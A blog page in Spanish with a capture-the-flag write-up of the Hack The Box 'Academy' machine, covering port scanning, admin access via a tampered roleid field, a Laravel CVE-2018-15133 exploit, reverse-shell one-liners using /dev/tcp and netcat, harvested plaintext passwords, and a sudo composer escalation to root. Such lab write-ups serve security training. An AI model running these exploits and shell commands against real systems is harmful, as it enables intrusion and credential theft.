@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="/theme/css/elegant.prod.9e9d5ce754.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="/theme/css/custom.css" media="screen">
+
+
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+
+        <link rel="dns-prefetch" href="//fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+
+        <meta name="author" content="Alexis Imhoff" />
+
+        <meta property="og:type" content="article" />
+        <meta name="twitter:card" content="summary">
+
+<meta name="keywords" content="CTF, offensive, HTB, " />
+
+<meta property="og:title" content="Resolución de máquina Academy "/>
+<meta property="og:url" content="/htb-academy.html" />
+<meta property="og:description" content="Enumeración Escaneo de puertos: nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.10.215 Host is up, received user-set (0.27s latency). Scanned at 2024-09-11 19:01:38 -03 for 21s Not shown: 64039 closed tcp ports (reset), 1493 filtered tcp ports (no-response) Some closed ports may …" />
+<meta property="og:site_name" content="alimh blog" />
+<meta property="og:article:author" content="Alexis Imhoff" />
+<meta property="og:article:published_time" content="2024-11-11T00:00:00-03:00" />
+<meta name="twitter:title" content="Resolución de máquina Academy ">
+<meta name="twitter:description" content="Enumeración Escaneo de puertos: nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.10.215 Host is up, received user-set (0.27s latency). Scanned at 2024-09-11 19:01:38 -03 for 21s Not shown: 64039 closed tcp ports (reset), 1493 filtered tcp ports (no-response) Some closed ports may …">
+
+        <title>Resolución de máquina Academy  · alimh blog
+</title>
+
+
+
+    </head>
+    <body>
+        <div id="content">
+            <div class="navbar navbar-static-top">
+                <div class="navbar-inner">
+                    <div class="container-fluid">
+                        <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </a>
+                        <a class="brand" href="/"><span class=site-name>alimh blog</span></a>
+                        <div class="nav-collapse collapse">
+                            <ul class="nav pull-right top-menu">
+                                <li >
+                                    <a href=
+                                       "/"
+                                    >Home</a>
+                                </li>
+                                <li ><a href="/categories.html">Categories</a></li>
+                                <li ><a href="/tags.html">Tags</a></li>
+                                <li ><a href="/archives.html">Archives</a></li>
+                                <li><form class="navbar-search" action="/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="container-fluid">
+              <div class="row-fluid">
+                <div class="span2"> 
+<aside id="sidebar">
+    <div class="about-me">
+        <img src="/images/avatar.webp" alt="Mi Foto" class="avatar">
+        <p>Hola! Soy Alexis Imhoff. Ingeniero en informática apasionado por la ciberseguridad. En este blog subiré writeups de CTFs y algun que otro tema relacionado a seguridad.</p>
+        <ul class="social-links">
+            <li>
+                <a href="https://www.linkedin.com/in/alexis-imhoff/" target="_blank" rel="noopener noreferrer">
+                    <i class="fab fa-linkedin"></i>
+                    <!-- Linkedin -->
+              </a>
+            </li>
+        </ul>
+    </div>
+</aside>
+                </div>
+              <div class="span10">
+<article itemscope>
+<div class="row-fluid">
+    <header class="page-header span10 offset1">
+        <h1>
+            <a href="/htb-academy.html">
+                Resolución de máquina Academy
+            </a>
+        </h1>
+    </header>
+</div>
+
+<div class="row-fluid">
+        <div class="span8 offset1 article-content">
+            
+            <p><img alt="machine" src="images/images_htb_academy/academy_logo.jpg"></p>
+<h1>Enumeración</h1>
+<p>Escaneo de puertos:</p>
+<div class="highlight"><pre><span></span><code>nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.10.215
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>Host is up, received user-set (0.27s latency).
+Scanned at 2024-09-11 19:01:38 -03 for 21s
+Not shown: 64039 closed tcp ports (reset), 1493 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE REASON
+22/tcp    open  ssh     syn-ack ttl 63
+80/tcp    open  http    syn-ack ttl 63
+33060/tcp open  mysqlx  syn-ack ttl 63
+</code></pre></div>
+
+<p>Detectamos versión y servicio de los puertos abiertos:</p>
+<div class="highlight"><pre><span></span><code>nmap -sC -sV -p22,80,33060 10.10.10.215
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>Host is up (0.27s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
+|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
+|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Did not follow redirect to http://academy.htb/
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message&quot;
+|_    HY000
+</code></pre></div>
+
+<p>El servicio HTTP hace un redirect a <strong>academy.htb</strong>, por lo que cargamos este registro en nuestro <em>/etc/hosts</em>.</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-1.jpg"></p>
+<p>El sitio nos ofrece la posibilidad de registrarnos como usuarios, por lo tanto, creamos uno e ingresamos:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-2.jpg"></p>
+<p>Lo navegamos un poco pero no encontramos nada relevante.</p>
+<p>Vamos a emplear el script <strong>http-enum</strong> de <em>nmap</em> para intentar encontrar directorios ocultos:</p>
+<div class="highlight"><pre><span></span><code>nmap --script<span class="o">=</span><span class="s1">&#39;http-enum&#39;</span> -p80 academy.htb
+</code></pre></div>
+
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-3.jpg"></p>
+<p>Además de <em>login.php</em>, que lo conocíamos, tenemos un <em>admin.php</em>. Vamos a emplear un diccionario más grande a ver si encontramos algo más con extensión .php:</p>
+<div class="highlight"><pre><span></span><code>wfuzz -c --hw<span class="o">=</span><span class="m">31</span> -t <span class="m">200</span> -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="s2">&quot;http://academy.htb/FUZZ.php&quot;</span>
+</code></pre></div>
+
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-4.jpg"></p>
+<p>Encontramos <em>config.php</em>.</p>
+<p>Al intentar acceder, <em>admin.php</em> nos muestra otro panel de login (probamos las credenciales del usuario que cree antes pero claramente no funciona). El archivo <em>config.php</em> no nos muestra nada.</p>
+<p>Vamos a intentar registrar un nuevo usuario y capturar la request con Burpsuite:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-5.jpg"></p>
+<p>Vemos que además de los campos de usuario y contraseña, también se envía un campo <strong>roleid</strong> que por default tiene un 0.</p>
+<p>Intentaremos crear un nuevo usuario: alim2, pero esta vez seteando el <em>roleid</em> en 1:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-6.jpg"></p>
+<p>Si ahora intentamos acceder al panel de administrador, podemos!</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-7.jpg"></p>
+<p>Vemos algunas cosas interesantes. Por un lado, dos potenciales usuarios: <strong>cry0l1t3</strong> y <strong>mrb3n</strong>.</p>
+<p>Por otro, al parecer está pendiente arreglar un error en: <strong>dev-staging-01.academy.htb</strong>. Esto es un subdominio que no conocíamos. Lo cargamos en el /etc/hosts e ingresamos:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-8.jpg"></p>
+<h1>Intrusión</h1>
+<p>Si miramos el contenido vemos que estamos ante <strong>Laravel</strong>, un framework de código abierto para desarrollar aplicaciones y servicios web con PHP 5 y PHP 7:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-9.jpg"></p>
+<p>Vamos a buscar exploits para esto:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-10.jpg"></p>
+<p>Existen vulnerabilidades para Laravel Framework que permite ejecución remota de código. Inicialmente encontramos un <a href="https://github.com/joshuavanderpoll/CVE-2021-3129">script</a> asociado al <strong>CVE-202-3129</strong>, pero no tenemos éxito.</p>
+<p>Luego, damos con el <strong>CVE-2018-15133</strong>. Encontramos el siguiente exploit: https://github.com/aljavier/exploit_laravel_cve-2018-15133</p>
+<p>Lo descargamos y lo probamos. Vemos que el uso es el siguiente:</p>
+<div class="highlight"><pre><span></span><code>pwn_laravel.py [-h] [-c COMMAND] [-m {1,2,3,4}] [-i] URL API_KEY
+</code></pre></div>
+
+<p>Por lo tanto, lo corremos de esta forma:</p>
+<div class="highlight"><pre><span></span><code>python3 pwn_laravel.py -c id http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0<span class="o">=</span>
+</code></pre></div>
+
+<p>Funciona!</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-11.jpg"></p>
+<h3>Obteniendo una Reverse Shell</h3>
+<div class="highlight"><pre><span></span><code>python3 pwn_laravel.py -c <span class="s2">&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.21/4343 0&gt;&amp;1&#39;&quot;</span> http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0<span class="o">=</span>
+</code></pre></div>
+
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-12.jpg"></p>
+<p>Hacemos un tratamiento de la TTY.</p>
+<h3>Metasploit</h3>
+<p>Vamos a probar también el módulo de Metasploit. Lo configuramos de la siguiente manera:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-13.jpg"></p>
+<p>Obtenemos la sesión:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-14.jpg"></p>
+<p>Para obtener una sesión completamente interactiva y trabajar mejor, vamos a ejecutar lo siguiente:</p>
+<div class="highlight"><pre><span></span><code>rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc <span class="m">10</span>.10.14.21 <span class="m">443</span> &gt;/tmp/f
+</code></pre></div>
+
+<p>Nos quedamos a la escucha con netcat en el puerto 443 y la recibimos:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-15.jpg"></p>
+<p>Ahora hacemos un tratamiento de la TTY.</p>
+<h1>Escalación de privilegios</h1>
+<p>Estamos como el usuario <strong>www-data</strong>. Vamos a dirigirnos unos directorios hacia atras y nos paramos en <em>/var/www/html</em>. Desde aquí, vamos a realizar una búsqueda por <em>config.php</em>, que era el otro archivo que habíamos detectado antes:</p>
+<div class="highlight"><pre><span></span><code>find . -type f -name config.php
+</code></pre></div>
+
+<p>Encontramos todos estos:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-16.jpg"></p>
+<p>Vamos revisando de a uno, y dentro de <strong>./academy/public/config.php</strong> vemos credenciales en texto plano:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-17.jpg"></p>
+<p>Son las credenciales para conectarnos a la base de datos:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;display_startup_errors&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
+<span class="nv">$link</span><span class="o">=</span><span class="nb">mysqli_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span><span class="s1">&#39;root&#39;</span><span class="p">,</span><span class="s1">&#39;GkEWXn4h34g8qx9fZ1&#39;</span><span class="p">,</span><span class="s1">&#39;academy&#39;</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+
+<p>Nos conectamos: </p>
+<div class="highlight"><pre><span></span><code>mysql -u root -D academy -p
+</code></pre></div>
+
+<p>Vemos todos los usuarios, incluso los que creamos antes:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-18.jpg"></p>
+<p>Esto no es de mucha ayuda.</p>
+<p>Seguimos navegando el server y dentro de <strong>/var/www/html/academy</strong> encontramos oculto el archivo <strong>.env</strong>. Dentro vemos credenciales en texto plano:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-19.jpg"></p>
+<div class="highlight"><pre><span></span><code>mySup3rP4s5w0rd!!
+</code></pre></div>
+
+<h3>Brute Force</h3>
+<p>Antes vimos dos potenciales usuarios y ahora tenemos una contraseña. Vamos a ver si se está reutilizando y aplica a alguno de los dos.</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-20.jpg"></p>
+<p>Efectivamente, es la contraseña del usuario <em>cry0l1t3</em>, por lo tanto, migramos a ese usuario.</p>
+<p>Aqui tenemos la primera flag:
+<img alt="academy" src="images/images_htb_academy/htb_academy-21.jpg"></p>
+<h2>cry0l1t3 to mrb3n</h2>
+<p>No encontramos forma de escalar privilegios hacia root con el usuario <strong>cry0l1t3</strong>, por lo que vamos a intentar migrar hacia el usuario <strong>mrb3n</strong>, que era el otro usuario que habíamos visto por la web.</p>
+<p>Vamos a usar <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LinPEAS</a> para que nos ayude a enumerar el sistema. Dentro de todo el output, vemos lo siguiente:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-22.jpg"></p>
+<p>En los logs de audit tenemos lo que parece ser la contraseña en texto plano del usuario <em>mrb3n</em>: <strong>mrb3n_Ac@d3my!</strong></p>
+<p>Lo probamos y funciona!</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-23.jpg"></p>
+<h2>mrb3n to root</h2>
+<p>Si ejecutamos <strong>sudo -l</strong> vemos que el usuario <em>mrb3n</em> puede ejecutar <strong>/usr/bin/composer</strong> como root sin especificar contraseña:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-24.jpg"></p>
+<p>Apoyándonos en GTFObins, vemos que podemos ejecutarlo de la siguiente manera para escalar privilegios:</p>
+<div class="highlight"><pre><span></span><code><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span>
+<span class="nb">echo</span> <span class="s1">&#39;{&quot;scripts&quot;:{&quot;x&quot;:&quot;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;}}&#39;</span> &gt;<span class="nv">$TF</span>/composer.json
+sudo composer --working-dir<span class="o">=</span><span class="nv">$TF</span> run-script x
+</code></pre></div>
+
+<p>Lo hacemos y somos root!</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-25.jpg"></p>
+<p>Desde aquí vemos la segunda flag:</p>
+<p><img alt="academy" src="images/images_htb_academy/htb_academy-26.jpg"></p>
+
+
+             
+ 
+            
+            
+            
+
+
+
+
+
+
+
+            <hr/>
+        </div>
+        <section id="article-sidebar" class="span2">
+            <h4>Published</h4>
+            <time itemprop="dateCreated" datetime="2024-11-11T00:00:00-03:00">lun 11 noviembre 2024</time>
+            <h4>Category</h4>
+            <a class="category-link" href="/categories.html#htb-ref">HTB</a>
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article">
+                <li><a href="/tags.html#ctf-ref">CTF
+                    <span class="superscript">9</span>
+</a></li>
+                <li><a href="/tags.html#offensive-ref">offensive
+                    <span class="superscript">11</span>
+</a></li>
+            </ul>
+            
+
+
+
+
+
+            
+
+
+
+
+
+        </section>
+</div>
+</article>
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides.
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>              </div>
+            </div>
+        </div>
+<footer>
+
+
+
+
+    <div id="fpowered">
+        Powered by: <a href="http://getpelican.com/" title="Pelican Home Page" target="_blank" rel="nofollow noopener noreferrer">Pelican</a>
+        Theme: <a href="https://elegant.oncrashreboot.com/" title="Theme Elegant Home Page" target="_blank" rel="nofollow noopener noreferrer">Elegant</a>
+    </div>
+</footer>            <script src="//code.jquery.com/jquery.min.js"></script>
+        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
+        <script src="/theme/js/elegant.prod.9e9d5ce754.js"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+
+    <script>
+    (function () {
+        if (window.location.hash.match(/^#comment-\d+$/)) {
+            $('#comment_thread').collapse('show');
+        }
+    })();
+    window.onhashchange=function(){
+        if (window.location.hash.match(/^#comment-\d+$/))
+            window.location.reload(true);
+    }
+    $('#comment_thread').on('shown', function () {
+        var link = document.getElementById('comment-accordion-toggle');
+        var old_innerHTML = link.innerHTML;
+        $(link).fadeOut(200, function() {
+            $(this).text('Click here to hide comments').fadeIn(200);
+        });
+        $('#comment_thread').on('hidden', function () {
+            $(link).fadeOut(200, function() {
+                $(this).text(old_innerHTML).fadeIn(200);
+            });
+        })
+    })
+</script>
+
+    </body>
+    <!-- Theme: Elegant built for Pelican
+        License : MIT -->
+</html>
